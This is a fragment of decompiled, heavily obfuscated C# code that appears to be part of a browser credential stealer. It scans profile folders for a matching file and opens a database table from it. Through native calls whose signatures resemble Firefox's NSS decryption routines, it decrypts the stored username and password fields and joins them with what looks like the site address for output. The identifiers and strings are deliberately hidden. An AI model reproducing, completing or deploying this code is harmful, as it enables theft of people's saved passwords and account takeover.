      public static long \u0002() => ((___codefort.P.\u0003.\u0005) Marshal.GetDelegateForFunctionPointer(___codefort.P.\u0003.\u0002(___codefort.P.\u0003.\u0002, I.\u0002(737971454)), typeof (___codefort.P.\u0003.\u0005)))();

      public static long \u0002(long _param0, bool _param1, long _param2) => ((___codefort.P.\u0003.\u0008) Marshal.GetDelegateForFunctionPointer(___codefort.P.\u0003.\u0002(___codefort.P.\u0003.\u0002, I.\u0002(737971356)), typeof (___codefort.P.\u0003.\u0008)))(_param0, _param1, _param2);

      public static int \u0002(IntPtr _param0, IntPtr _param1, StringBuilder _param2, int _param3) => ((___codefort.P.\u0003.\u0006) Marshal.GetDelegateForFunctionPointer(___codefort.P.\u0003.\u0002(___codefort.P.\u0003.\u0002, I.\u0002(737971380)), typeof (___codefort.P.\u0003.\u0006)))(_param0, _param1, _param2, _param3);

      public static int \u0002(
        ref ___codefort.P.\u0003.\u0002 _param0,
        ref ___codefort.P.\u0003.\u0002 _param1,
        int _param2)
      {
        return ((___codefort.P.\u0003.\u000E) Marshal.GetDelegateForFunctionPointer(___codefort.P.\u0003.\u0002(___codefort.P.\u0003.\u0002, I.\u0002(737971275)), typeof (___codefort.P.\u0003.\u000E)))(ref _param0, ref _param1, _param2);
      }

      public static void \u0002(string _param0)
      {
        foreach (string directory in Directory.GetDirectories(Environment.GetEnvironmentVariable(I.\u0002(737971297)) + I.\u0002(737971319)))
        {
          foreach (string file in Directory.GetFiles(directory))
          {
            if (Regex.IsMatch(file, I.\u0002(737971223)))
            {
              ___codefort.P.\u0003.\u0002(directory);
              ___codefort.P.\u0003.\u0003 = file;
            }
          }
        }
        string str = ___codefort.P.\u0003.\u0003;
        ___codefort.P.\u0003.\u0002 obj1 = new ___codefort.P.\u0003.\u0002();
        ___codefort.P.\u0003.\u0002 obj2 = new ___codefort.P.\u0003.\u0002();
        ___codefort.P.\u0002 obj3 = new ___codefort.P.\u0002(str);
        DataTable dataTable = obj3.\u0002(I.\u0002(737971234));
        obj3.\u0002(I.\u0002(737971650));
        ___codefort.P.\u0003.\u0002(___codefort.P.\u0003.\u0002(), true, 0L);
        foreach (DataRow row in (InternalDataCollectionBase) dataTable.Rows)
        {
          ___codefort.P.\u0003.\u0005 = ___codefort.P.\u0002(Convert.ToString(row[I.\u0002(737971691)].ToString()));
          StringBuilder stringBuilder1 = new StringBuilder(row[I.\u0002(737971591)].ToString());
          ___codefort.P.\u0003.\u0002 structure1 = (___codefort.P.\u0003.\u0002) Marshal.PtrToStructure(new IntPtr(___codefort.P.\u0003.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder1, stringBuilder1.Length)), typeof (___codefort.P.\u0003.\u0002));
          if (___codefort.P.\u0003.\u0002(ref structure1, ref obj1, 0) == 0 && obj1.\u0005 != 0)
          {
            byte[] numArray = new byte[obj1.\u0005];
            Marshal.Copy(new IntPtr(obj1.\u0003), numArray, 0, obj1.\u0005);
            ___codefort.P.\u0003.\u0008 = ___codefort.P.\u0002(Encoding.ASCII.GetString(numArray));
          }
          StringBuilder stringBuilder2 = new StringBuilder(row[I.\u0002(737971615)].ToString());
          ___codefort.P.\u0003.\u0002 structure2 = (___codefort.P.\u0003.\u0002) Marshal.PtrToStructure(new IntPtr(___codefort.P.\u0003.\u0002(IntPtr.Zero, IntPtr.Zero, stringBuilder2, stringBuilder2.Length)), typeof (___codefort.P.\u0003.\u0002));
          if (___codefort.P.\u0003.\u0002(ref structure2, ref obj2, 0) == 0 && obj2.\u0005 != 0)
          {
            byte[] numArray = new byte[obj2.\u0005];
            Marshal.Copy(new IntPtr(obj2.\u0003), numArray, 0, obj2.\u0005);
            ___codefort.P.\u0003.\u0006 = Encoding.ASCII.GetString(numArray);
          }
          ___codefort.P.\u0002(\u000F.\u0002.O + I.\u0002(737971639), I.\u0002(737971647) + \u000F.\u0002.F + I.\u0002(737971530) + ___codefort.P.\u0003.\u0008 + I.\u0002(737971566) + ___codefort.P.\u0003.\u0006 + I.\u0002(737971580) + ___codefort.P.\u0003.\u0005);
        }
      }

      public struct \u0002
      {
        public int \u0002;
        public int \u0003;
        public int \u0005;
      }

      [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
      public delegate long \u0003(string _param1);

      [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
      public delegate long \u0005();

      [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
      public delegate int \u0006(
        IntPtr _param1,
        IntPtr _param2,
        StringBuilder _param3,
        int _param4);

      [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
      public delegate long \u0008(long _param1, bool _param2, long _param3);

      [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
      public delegate int \u000E(
        ref ___codefort.P.\u0003.\u0002 _param1,
        ref ___codefort.P.\u0003.\u0002 _param2,
        int _param3);
    }

    internal struct \u0005
    {
      public int \u0002;
      public int \u0003;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string \u0005;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string \u0008;
      public long \u0006;
      public int bd;
      public int bc;
      public int P;
      public int O;
      public IntPtr R;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Q;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string T;
    }

    internal struct \u0008
    {
      public int \u0002;
      public int \u0003;
    }
  }
}
